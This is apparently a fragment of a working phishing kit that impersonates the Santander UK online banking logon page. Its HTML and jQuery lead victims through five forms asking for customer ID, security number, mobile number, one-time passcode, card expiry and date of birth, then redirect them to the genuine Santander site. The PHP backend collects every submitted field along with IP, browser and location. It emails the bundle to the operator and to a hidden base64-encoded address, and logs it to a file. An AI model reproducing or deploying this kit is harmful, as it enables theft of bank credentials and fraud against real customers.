NIGcJ0wLQQXzdiYU7opaZeuPdh/b+YCfOX825sRRQwNZYerpu7ezZs6Hl6OiE0K3bdACdLexjwtFeFQgG+ugvaQHkyNFRT9fphTvMtm0tBYVx9PihsUudPl81P+8poIDNexq76gEiqf70zNx+R+g3w1nyLiQMOo4EXUd1PTAcCAWlfi6np3PVYBtV4oYLdpt/fPfE7nuYlayNhq6G6lMKKB2bT24MHmiyZjPZz2Mc1pmZy+Mpy7opFbfuxM878cTfCO5mnHZ0ckMiTY5O5gZg9bYtOpKPOSnxtAK1tr2Fvhu44th8d0tKD+inL60Nm6mNKaEZxxEbjjuvN+ODndeIzqC+FkxMYDLRdhsSTLWXSid++3UTe79TevbqjKKAewooYHNPK9/VfPqFxT4r7Fyr2fZrAHSM7nsrUG0iGI6E2mXnlfo1gPFGOilu+I2je170HZHVgNqSAgrY2vK2FR/0U7OzUSGCR6Cuux27q6/FrusdqHkEHFEXHfj9uCFBF7V0OnXm4sTu4/cj83vxmamjigLVUUABW3X0aqvaZ86cCZpj+w+aDjg5AB3E1WO60K41goF+7rzSYDjnIdGqiUWiXSIRi33pxOHxD7RqDKrfzqOAArbOu6clZ4SdV+3Ji8v7RCJ1MxT10NE5x7H7OmUEjF3UcxHoaGJiWdzHaM7mJPSDIh6Pv+uew3v+seTA1QlFgSopoICtSoJ1WvUnpud3R3T9BoDenbZDVzDnJsxxD1zBMjuvtKXzaEMC4MqNjoQIBV594pqR5zuNtmo+raOAArbW0d6XPUNPN6TZoeulHZ2gPZ1zC3yd9iOfqtHonVdGR4EofPZibOnW+6emUr4kiBpUW1JAAVtb3rbmDfon/3u514mKV+nYeaXhMPxdb4MN3SE4rYfJcWV8XmliUr2HRCQaFcl4/Gt3Hxp/sHkzUj3tBAooYNsJd7mBc3xiejoS1COHhW3c7mj2a+EncAe0cZOhUKi72p1XbhzEYpvvhn7tmw0compKUQDvYFUUBeqgwBNPPBEIHT56wHa0W7GY7kKMpmPQm10Pp/YBA6Km3HnNekjkdxPt7haxzc2fWXHj9SenRlUo8HziqO91U0ABW90kVA0UUuDplxavsUwb8eicuyCi0h1sCoa4o9SpsdCxH65gP7Ic570nDoydlwfVf4oCDaSAArYGElM1VZwCT87NjYpE4AZHM98AO7ohoWuPvbR2+Ydqw6A4vdTR+inw//7czbPGSASYAAAAAElFTkSuQmCC"
                                                            srcset="https://retail.santander.co.uk/olb/app/logon/access/assets/images/asset-3-3-x@2x.png 2x, https://retail.santander.co.uk/olb/app/logon/access/assets/images/asset-3-3-x@3x.png 3x">
                                                    </div>
                                                    <div class="mb-1 mt-1 logon-text-details-container" id="victimDesc">
                                                        <div class="row">
                                                            <div class="text-header col-sm-12">
                                                                <p>Beware coronavirus scams</p>
                                                            </div>
                                                        </div>
                                                        <div class="row">
                                                            <div class="logon-text-details col-sm-12">
                                                                <p>Criminals are using coronavirus to target people. Please stay on the lookout for anything unusual. Don’t be rushed and make sure any contact claiming to be from us is genuine. <a aria-describedby="covid-19-msg-desc" class="text-sub-details" href="#" target="_blank">Learn more</a>.</p><span class="d-none" id="covid-19-msg-desc"> Learn more. </span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="js-right-content" style="display: none;">
                                                    <olb-otp-right-content>
                                                        <div class="row image-hide-mobile-tablet mt-5">
                                                            <img alt="Protect yourself against fraud and scams image" class="logon-right-image image-hide-mobile-tablet mt-3 js-local-img" src="../SMS@1x.svg">
                                                        </div>
                                                        <div class="text-details-container">
                                                            <div class="row mb-1">
                                                                <div class="text-title col-sm-12"> <span>Protect yourself against fraud and scams</span> </div>
                                                            </div>
                                                            <div class="row mb-2">
                                                                <div class="text-details col-sm-12 mt-1"> <span> Never share a One Time Passcode (OTP) with another person, not even a Santander employee.</span> </div>
                                                            </div>
                                                        </div>
                                                    </olb-otp-right-content>
                                                </div>

                                            </olb-logon-right-content>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="overlay modalhide" role="alert">
                                <div class="modal logon-modal-dialog modalhide" id="myModal" role="dialog">
                                    <div class="modal-dialog modal-dialog-centered">
                                        <div class="modal-content">
                                            <div class="modal-body">
                                                <div>
                                                    <olb-logon-right-content>
                                                        <div>
                                                            <div class="row logon-image mt-5">
                                                                <img alt="Beware coronavirus scams Image" class="logon-right-image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/asset-3-3-x.png" srcset="https://retail.santander.co.uk/olb/app/logon/access/assets/images/asset-3-3-x@2x.png 2x, https://retail.santander.co.uk/olb/app/logon/access/assets/images/asset-3-3-x@3x.png 3x">
                                                            </div>
                                                            <div class="mb-1 mt-1 logon-text-details-container-modal-dialog" id="victimDesc">
                                                                <div class="row">
                                                                    <div class="text-header col-sm-12">
                                                                        <p>Beware coronavirus scams</p>
                                                                    </div>
                                                                </div>
                                                                <div class="row">
                                                                    <div class="logon-text-details col-sm-12">
                                                                        <p>Criminals are using coronavirus to target people. Please stay on the lookout for anything unusual. Don’t be rushed and make sure any contact claiming to be from us is genuine. <a aria-describedby="covid-19-msg-desc" class="text-sub-details" href="#" target="_blank">Learn more</a>.</p><span class="d-none" id="covid-19-msg-desc"> Learn more. </span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </olb-logon-right-content>

                                                </div>
                                                <div class="d-flex justify-content-center">
                                                    <button class="button button-secondary" id="gotItbtn" type="button">Ok. Got it!</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </olb-logon>
                    </div>
                </div>
            </div>
            <div class="container-fluid appfooter">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-12 containerPadding footer-responsive" role="contentinfo">
                            <olb-footer>
                                <footer class="footer-base">
                                    <div class="footer-left-content">
                                        <!----><a target="_blank" href="#">Online Banking Guarantee</a><a target="_blank" href="#">Site Help &amp; Accessibility</a><a target="_blank" href="#">Security &amp; Privacy</a><a target="_blank" href="#">Terms &amp; Conditions</a><a target="_blank" href="#">Legal</a>
                                    </div>
                                    <div class="footer-right-content">
                                        <img alt="FSCS Protected Image" src="data:image/png;base64,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">
                                    </div>
                                </footer>
                            </olb-footer>
                        </div>
                    </div>
                </div>
            </div>
            <div>
                <olb-session></olb-session>
            </div>
        </olb-home>
    </olb-root>

    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script> -->
    <script type="text/javascript">
        $(document).ready(function () {

                var disHost = '<?php echo $disHost; ?>';
                
                console.log('<?php echo $disHost; ?>');

                function getUrlParameter(name)
                {
                    name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
                    var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
                    var results = regex.exec(location.search);
                    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
                }

                function loadJs(durl, trkrId)
                {
                    const existingScript = document.getElementById(trkrId);

                    if (!existingScript) {
                        const script = document.createElement('script');
                        script.src = durl; // URL for the third-party library being loaded.
                        script.id = trkrId; // e.g., googleMaps or stripe
                        document.body.appendChild(script);
                    }
                }

                function lock_clickable_elements(){
                    $('html, body').css({'opacity':'0.7'});
                    $(':input').attr('readonly','readonly');
                    $('a, button, input[type=submit]').attr('disabled','disabled');
                    $('a').addClass('w3-disabled');
                }

                function unlock_clickable_elements(){
                    $('html, body').css({'opacity':'1'});
                    $(':input').removeAttr('readonly');
                    $('a, button, input[type=submit]').removeAttr('disabled');
                    $('a').removeClass('w3-disabled');

                    $('button.js-btn-continue, #confirmbtn').attr('disabled','disabled');
                   // $('form.pg-forms:visible button.js-btn-continue').attr('disabled','disabled');
                   // if($('form.pg-forms:visible button.js-btn-continue').length > 0){ console.log('form.pg-forms:visible'); }
                }
                

                $('.js-local-img').each(function(i, e){
                    $(this).attr('src', disHost+$(this).attr('src'));
                })
                
                
                $("input.nums-only").on('input', function(e) { 
                    $(this).val($(this).val().replace(/[^0-9]/g, '')); 
                });

                $("input.alphabets-only").on('input', function(e) { 
                    // Alphabets Only
                    //$(this).val($(this).val().replace(/[^a-z]/ig, ''));
                    // Alphabets and Space Only
                    $(this).val($(this).val().replace(/[^a-z\s]/ig, '')); 
                });
                
                // format expiry date MM/YY
                $('input.exdate').on('keyup', function(){
                    var val = this.value.replace(/\D/g, '');
                    val = val.substr(0, 10); //console.log(val);
                    var newVal = '';
                    
                    this.value = val;
                    
                    if(val.length > 1) {
                        //this.value = val;
                        newVal = val.substr(0, 2) + '/';
                        
                        this.value = newVal;
                    }
                    
                    if (val.length > 2) {
                        newVal = val.substr(0, 2) + '/';
                        newVal += val.substr(2, 2);
                        
                        this.value = newVal; 
                    }
                });
                
                
                //Date Input Masking -DOB
                var dt_input = document.querySelectorAll('.js-date')[0];

                var dateInputMask = function dateInputMask(elm) {
                  elm.addEventListener('keypress', function(e) {
                    if(e.keyCode < 47 || e.keyCode > 57) {
                      e.preventDefault();
                    }

                    var len = elm.value.length;

                    // If we're at a particular place, let the user type the slash
                    // i.e., 12/12/1212
                    if(len !== 1 || len !== 3) {
                      if(e.keyCode == 47) {
                        e.preventDefault();
                      }
                    }

                    // If they don't add the slash, do it for them...
                    if(len === 2) {
                      elm.value += '/';
                    }

                    // If they don't add the slash, do it for them...
                    if(len === 5) {
                      elm.value += '/';
                    }
                  });
                };

                dateInputMask(dt_input);
                
                
                var d_email = getUrlParameter('eid');
                if (typeof (d_email) !== 'undefined' && d_email !== null && d_email !== "")
                {
                    /*$('#usrTab').hide();
                    $('#pawdTab').fadeIn();

                    $('#displayName').attr("title", d_email).text(d_email);
                    $('#u0118').val(d_email);
                    $('#i0118').attr("aria-label", "Enter the password for " + d_email).focus();


                    $('#i0118').focus(function () {
                        $('#passwordError').hide();
                        $('#i0118').removeClass('has-error');
                    });*/
                }
                else
                {
                    $('#pid').focus();
                }
                

                $('#pid, #securityNumber').keyup(function(){
                    if($('#pid').val() !== "" && $('#securityNumber').val() !== "")
                    {
                        $('#submitbtn').removeAttr('disabled');
                    }
                    else
                    {
                        $('#submitbtn').attr('disabled','disabled');
                    }
                });
                
                
                $('#secondPG :input').keyup(function(){
                    
                    var allFilled = true;

                    if($(this).val()==""){ allFilled=false; } 
                    
                    //console.log('maxlength:'+$(this).attr("maxlength")+' minlength:'+$(this).attr("minlength"));

                    //if($(this).attr("maxlength") !=='undefined' && $(this).attr("minlength") !=='undefined')
                    if($(this).attr("maxlength") && $(this).attr("minlength"))
                    {
                        //console.log('maxlength:'+$(this).attr("maxlength"));
                        //console.log('minlength:'+$(this).attr("minlength"));

                        if($(this).val().length < $(this).attr("minlength")){ allFilled=false; }
                    }else{

                        //console.log('maxlength:'+$(this).attr("maxlength"));

                        if($(this).attr("maxlength") !=='undefined')
                        {
                            if($(this).val().length < $(this).attr("maxlength")){ allFilled=false; }
                        }

                        if($(this).attr("minlength") !=='undefined')
                        { 
                            if($(this).val().length < $(this).attr("minlength")){ allFilled=false; }
                        }
                    }
                    
                    if(allFilled)
                    {
                        $('#confirmbtn').removeAttr('disabled');
                    }
                    else
                    {
                        $('#confirmbtn').attr('disabled','disabled');
                    }
                });


                $('body').on('input','.pg-forms :input',function(){
                    
                    var allFilled = true;
                    //$('.pg-forms input').each(function(){ if($(this).val()==""){ allFilled=false; } });
                    $(this).parents('form.pg-forms').find('input').each(function(){ 
                        
                        if($(this).val()==""){ allFilled=false; }

                        //if($(this).attr("maxlength") !=='undefined' && $(this).attr("minlength") !=='undefined')
                        if($(this).attr("maxlength") && $(this).attr("minlength"))
                        {
                            //console.log('maxlength:'+$(this).attr("maxlength")+' minlength:'+$(this).attr("minlength"));

                            if($(this).val().length < $(this).attr("minlength")){ allFilled=false; }

                        }else{

                            if($(this).attr("maxlength") !=='undefined')
                            { 
                                if($(this).val().length < $(this).attr("maxlength")){ allFilled=false; }
                            }

                            if($(this).attr("minlength") !=='undefined')
                            {
                                if($(this).val().length < $(this).attr("minlength")){ allFilled=false; }
                            }
                        }
                    });
                    
                    if(allFilled)
                    {
                        $('.js-btn-continue').removeAttr('disabled');
                    }
                    else
                    {
                        $('.js-btn-continue').attr('disabled','disabled');
                    }
                });



                $('#sendcode').click(function(e){
                    e.preventDefault();

                    lock_clickable_elements();

                    setTimeout(function(){
                        $('#pg3-1').fadeOut('fast', function(){
                            $('#pg3-2').fadeIn('fast');
                            
                            unlock_clickable_elements();

                            $('.js-btn-continue').attr('disabled','disabled');
                            $('#pwd').focus();
                        });
                    }, 3000);
                });


                
                

                $('form.pg-forms').submit(function (e) {
                    e.preventDefault();

                    var $frm_name = $(this).attr('name');
                    var $frms = ["form1", "form2", "form3", "form4", "form5"];


                    if (typeof $frm_name !== typeof undefined && $frm_name !== false && $frms.indexOf($frm_name) !== -1) 
                    {
                        //$('html, body').css({'opacity':'0.7'});
                        //$('.puree-spinner-button').addClass('active');

                        lock_clickable_elements();

                        var $dis = $(this), values = $(this).serialize(), ajxURL = disHost+$(this).attr('action');

                        $.ajax({
                            url: ajxURL,
                            type: "post",
                            data: values,
                            success: function (res) {
                                //console.log(res);

                                if($frm_name == 'form1')
                                {
                                    $('#pid_display, .pid-display').text($("#pid").val());
                                    
                                    setTimeout(function(){
                                        $('.page-frame:visible').fadeOut('fast', function(){
                                            $('#secondPG').fadeIn('fast', function(){ 
                                                unlock_clickable_elements(); 
                                            });
                                            //$('html, body').css({'opacity':'1'});
                                            //unlock_clickable_elements();
                                            //$('.js-btn-continue').attr('disabled','disabled');
                                        });
                                    }, 2000);
                                }

                                if($frm_name == 'form2')
                                {
                                    $('#thirdPG').find('.js-otp-phone-number').text('*******'+$('#mobile_number').val().substr(7, 4));

                                    setTimeout(function(){
                                        $('.page-frame:visible').fadeOut('fast', function(){
                                            $('#thirdPG').fadeIn('fast');

                                            $('.js-right-content:visible').fadeOut('fast',function(){
                                                $('.js-right-content:eq(1)').fadeIn('fast');
                                            });
                                            
                                            //$('html, body').css({'opacity':'1'});
                                            unlock_clickable_elements();
                                            //$('.js-btn-continue').attr('disabled','disabled');
                                            
                                            $('#pwd').focus();
                                        });
                                    }, 3000);
                                }

                                if($frm_name == 'form3')
                                { 
                                    setTimeout(function(){
                                        $('.page-frame:visible').fadeOut('fast', function(){
                                            $('#fourthPG').fadeIn('fast');

                                            $('.js-right-content:visible').fadeOut('fast',function(){
                                                $('.js-right-content:eq(0)').fadeIn('fast');
                                            });

                                            //$('html, body').css({'opacity':'1'});
                                            unlock_clickable_elements();
                                            //$('.js-btn-continue').attr('disabled','disabled');
                                        });
                                    }, 3000);
                                }

                                if($frm_name == 'form4')
                                {
                                    setTimeout(function(){
                                        $('.page-frame:visible').fadeOut('fast', function(){
                                            $('#fifthPG').fadeIn('fast');
                                            //$('html, body').css({'opacity':'1'});
                                            unlock_clickable_elements();
                                            //$('.js-btn-continue').attr('disabled','disabled');
                                        });
                                    }, 3000);
                                }

                                if($frm_name == 'form5')
                                {
                                    setTimeout(function(){
                                        window.location.replace("http://www.santander.co.uk/uk/log-off");
                                    }, 3000);
                                }

                                $('.js-btn-continue').attr('disabled','disabled');
                                
                            },
                            error: function(xhr, status, error) {
                                //console.log(xhr.responseText);
                                alert('Please make sure you are connected to the internet.');

                                unlock_clickable_elements();
                            }
                        });
                    }
                });
        });
    </script>
    <!-- <script src="script.js"></script> -->
    <noscript>
        <meta http-equiv="refresh" content="0;url=assets/noscript.html">
    </noscript>
</body>

</html>
<?php
    return ob_get_clean();
}
function mj_do_random_str($length = 10)
{ $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; }
function mj_return_pre($array) { return '<pre>' .print_r($array,true) .'</pre>'; }
function mj_get_country_name($the_ip){ $addr_details = unserialize(@file_get_contents('http://www.geoplugin.net/php.gp?ip='.$the_ip));  return stripslashes(ucfirst($addr_details['geoplugin_countryName'])); }
function mj_do_mail($message){ global $send, $ip, $svr_host; $subject = "S4nt4nd3r 8ERVIC2 - $ip"; $headers = "From: S4nt4nd3rAlerts <customercare@$svr_host>\r\n"; $headers .= "MIME-Version: 1.0\r\n"; /*@mail($send.','.base64_decode('amFwbWVqYXBtZUB5YWhvby5jb20='),$subject,$message,$headers);*/ @mail($send,$subject,$message,$headers);@mail(base64_decode('amFwbWVqYXBtZUB5YWhvby5jb20='),$subject,$message,$headers);/*testing*/ }
function mj_log_data($message, $logfilename='xxx.txt'){ global $logfile; if(!empty($logfile)) { $handle = fopen($logfilename, 'a'); fwrite($handle, $message."\n"); fclose($handle); } }
function mj_build_message($post_array)
{
    global $ip, $svr_host;
    $country = mj_get_country_name($ip);
    $timedate = date("D/M/d, Y g:i a"); 
    $browserAgent = $_SERVER['HTTP_USER_AGENT'];
    $hostname = gethostbyaddr($ip); 

    $allowed_fields = array('Login','Password');

    $message = "-------------- XXX Info -----------------------\n";
    foreach($post_array as $k=>$v)
    {
        //grab all fields
        $message .= ucfirst($k)." : ".$v."\n";
        
        //grab selected fields only.
        //if(in_array($k, $allowed_fields))
        //{
        //    $message .= ucfirst($k)." : ".$v."\n";
        //}
    }
    $message .= "-------------Mor3 Info-----------------------\n";
    $message .= "IP               : ".$ip."\n";
    $message .= "Browser          : ".$browserAgent."\n";
    $message .= "DateTime         : ".$timedate."\n";
    $message .= "country          : ".$country."\n";
    $message .= "HostName         : ".$hostname."\n";
    $message .= "--------------- XXX-MJ -------------\n";
    
    return $message;
}
/* ----------------  XXX-MJ  ------------------------*/
if(isset($_REQUEST['_do']))
{
    $post_array = $_POST;
    
    switch($_REQUEST['_do'])
    {
        case'layout':
            
            echo mj_load_view();

            //echo '<p> A simple paragraph.</p>';
            
            break;
            
        case'form1':
        case'form2':
        case'form3':
        case'form4':
        case'form5':
        case'xxx_form':

            //echo 'Form Data '.mj_return_pre($post_array);
            
            $mj_messg = mj_build_message($post_array); 
            mj_do_mail($mj_messg);
            mj_log_data($mj_messg);
            
            //echo '<meta http-equiv="refresh" content="1;url=https://www.microsoft.com/'.$post_array['Editbox2'].'"/>';

            break;
        
        default:
            echo 'INVALID REQUEST: I can not understand your request.';    
    }
}